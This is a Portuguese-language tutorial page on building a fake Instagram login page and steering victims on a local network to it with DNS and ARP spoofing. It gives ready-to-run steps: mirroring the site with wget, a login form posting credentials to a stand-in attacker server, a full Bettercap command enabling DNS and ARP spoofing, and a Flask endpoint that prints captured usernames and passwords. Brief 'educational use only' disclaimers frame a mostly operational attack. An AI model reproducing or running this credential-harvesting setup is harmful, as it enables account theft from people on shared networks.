<header>
<h1>Como Criar uma Página Falsa Usando DNS Spoofing e ARP Spoofing</h1>
</header>

<section>
<h2>Descrição</h2>
<p>Este projeto é uma demonstração de como ataques como DNS Spoofing e ARP Spoofing podem ser utilizados para redirecionar o tráfego da vítima para uma página falsa que você controla. Lembre-se, essas técnicas devem ser usadas apenas para fins educativos e em ambientes controlados. Qualquer uso mal-intencionado é ilegal e antiético.</p>
</section>

<section>
<h2>Objetivo</h2>
<p>O objetivo deste projeto é mostrar como um atacante pode redirecionar tráfego de uma rede local para uma página falsa, a qual coleta dados de login sensíveis (por exemplo, credenciais de um site como o Instagram).</p>
</section>

<section>
<h2>Como Funciona</h2>
<h3>DNS Spoofing (Falsificação de DNS)</h3>
<p>O atacante intercepta as consultas DNS e engana a vítima, direcionando o tráfego de um site legítimo (como "instagram.com") para seu próprio servidor.</p>

<h3>ARP Spoofing (Falsificação de ARP)</h3>
<p>Esse ataque manipula a tabela ARP, fazendo com que os pacotes da vítima sejam enviados para o computador do atacante.</p>

<h3>Página Falsa (Phishing)</h3>
<p>O atacante cria uma página que se parece com o site original (por exemplo, o Instagram), mas com a funcionalidade de coletar dados inseridos pela vítima, como nome de usuário e senha.</p>
</section>

<section>
<h2>Como Criar a Página Falsa</h2>

<h3>Passo 1: Baixar o código do site original</h3>
<p>Você pode usar ferramentas como <code>wget</code> ou <code>curl</code> para baixar o código HTML do site original. Isso permite que você tenha uma cópia do site em seu computador.</p>
<pre><code>wget -r -np -k http://instagram.com</code></pre>

<h3>Passo 2: Modificar o código para coletar dados</h3>
<p>Depois de ter o código do site, altere-o para incluir um formulário falso de login. Esse formulário irá coletar as credenciais inseridas pela vítima.</p>
    <pre>
    <code>

        <form action="http://seu-servidor.com/pegar-dados" method="post">
        <input type="text" name="username" placeholder="Usuário">
        <input type="password" name="password" placeholder="Senha">
        <input type="submit" value="Entrar">
        </form>
    </code>
    </pre>

<h3>Passo 3: Servir a página falsa localmente</h3>
<p>Você pode usar Python para criar um servidor local e servir a página falsa. Para isso, basta rodar o seguinte comando:</p>
<pre><code>python3 -m http.server 8080</code></pre>

<h3>Passo 4: Configurar o ataque de DNS e ARP Spoofing</h3>
<p>Agora que você tem a página falsa e o servidor local configurados, é necessário redirecionar o tráfego para o seu computador. Isso pode ser feito usando ferramentas como o Bettercap.</p>
<pre><code>
sudo bettercap -iface wlan0 -eval "set dns.spoof.domains instagram.com.br; set dns.spoof.address 192.168.10.103; dns.spoof on; arp.spoof on"
</code></pre>
<p>Este comando faz com que o tráfego destinado ao "instagram.com.br" seja redirecionado para o seu servidor local (no caso, 192.168.10.103).</p>

<h3>Passo 5: Coletar os dados</h3>
<p>Quando a vítima acessar a página falsa e preencher o formulário de login, os dados serão enviados para o servidor especificado no atributo action do formulário.</p>
<p>Se você estiver usando Flask, você pode configurar um servidor para coletar esses dados:</p>
<pre>
<code>
from flask import Flask, request

app = Flask(__name__)

@app.route('/pegar-dados', methods=['POST'])
def pegar_dados():
    usuario = request.form['username']
    senha = request.form['password']
    print(f"Usuário: {usuario} | Senha: {senha}")
    return "Dados coletados!"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
</code></pre>
</section>

<section>
<h2>Resumo do Processo</h2>
<ol>
<li>A vítima tenta acessar "instagram.com".</li>
<li>O tráfego é redirecionado para o seu servidor local devido ao ataque de DNS Spoofing.</li>
<li>O servidor local serve a página falsa.</li>
<li>A vítima insere as credenciais de login na página falsa.</li>
<li>Os dados coletados são enviados para o seu servidor, permitindo que você capture as informações.</li>
</ol>
</section>

<section>
<h2>Aviso Legal</h2>
<p>Este tipo de atividade é ilegal e antiética. O uso dessas técnicas deve ser restrito a ambientes controlados e com a permissão explícita dos envolvidos, como em laboratórios de segurança e para fins educativos. Realizar ataques como este em redes ou sistemas sem autorização pode resultar em sérias consequências legais.</p>
</section>
